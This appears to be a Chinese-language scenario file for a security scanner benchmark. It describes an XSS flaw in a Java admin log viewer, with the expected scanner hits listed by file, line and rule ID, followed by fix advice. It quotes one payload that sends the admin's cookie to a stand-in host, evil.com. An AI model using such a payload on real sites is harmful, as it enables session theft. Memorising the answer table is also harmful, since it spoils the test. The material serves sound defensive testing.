---
title: "Scenario-07: 日志管理系统回显未转义用户输入的反射型 XSS"
layout: scenario
---

## 业务背景

一个**管理后台的日志查看功能**。系统中记录用户各种操作日志，包括用户提交的表单数据、搜索关键词、评论内容等。管理员在后台查看日志时，日志内容（包含用户提交的数据）被直接渲染到管理页面上。

由于日志内容本身可能包含用户输入的恶意脚本，且后端没有对日志展示做任何转义处理，当管理员查看日志时就会触发 XSS 攻击。这是一个典型的**存储型 XSS 变种**（但从"查看日志"这个操作的输入来源看，也具有反射型特征）。

## 数据流路径

```
用户提交恶意数据:
  → 攻击者提交评论/反馈等包含 <script> 的数据
  → 数据被记录到日志系统（LogService.recordLog）

管理员查看日志:
  → GET /admin/logs?level=ERROR
  → LogController.viewLogs(@RequestParam level)
  → LogService.queryLogs() ← 返回包含未转义用户输入的日志
  → model.addAttribute("logs", logEntries) ← 未转义
  → admin.jsp: ${log.message} ← 直接输出
  → log-viewer.js: 通过 innerHTML 展示日志详情 ← 前端也在劫难逃
```

## 脆弱点说明

### 主要漏洞点（预期扫描命中）

| 文件 | 行号范围 | 规则 ID | 说明 |
|------|----------|---------|------|
| LogController.java | ~第35行 | JAVA-IN-002 | @RequestParam 接收用户输入 |
| LogController.java | ~第50行 | JAVA-OUT-007 | model.addAttribute 传递未转义日志数据 |
| LogController.java | ~第65行 | JAVA-OUT-007 | 另一个 model.addAttribute 传递未转义数据 |
| admin.jsp | ~第25行 | JAVA-OUT-002 | EL 表达式 ${log.message} 直接输出日志内容 |
| admin.jsp | ~第35行 | JAVA-OUT-002 | EL 表达式 ${log.detail} 直接输出日志详情 |
| log-viewer.js | ~第40行 | FE-OUT-001 | innerHTML 直接展示日志详情 |
| log-viewer.js | ~第55行 | FE-OUT-009 | 模板字符串拼接 HTML |

### 为什么这是漏洞

1. 攻击者可以提交包含恶意脚本的数据（如评论内容 `<script>new Image().src="http://evil.com/steal?c="+document.cookie</script>`）
2. 这些数据被 `LogService.recordLog()` 记录到日志系统中（未转义）
3. 管理员通过 `LogController.viewLogs()` 查询日志时，日志条目通过 `model.addAttribute` 传入视图
4. `admin.jsp` 使用 EL 表达式 `${log.message}` 直接输出日志内容
5. 前端的 `log-viewer.js` 进一步通过 `innerHTML` 渲染日志详情
6. 管理员浏览器执行了恶意脚本，攻击者可以窃取管理员 Session 或执行其他恶意操作

### 修复建议

- 在 JSP 中使用 `<c:out value="${log.message}" />` 替代 `${log.message}`
- 在 `LogService` 返回日志数据前使用 `HtmlUtils.htmlEscape()` 进行编码
- 前端使用 `textContent` 替代 `innerHTML`
- 对日志中需要展示的 HTML 标签使用白名单过滤（如使用 Jsoup 或 DOMPurify）
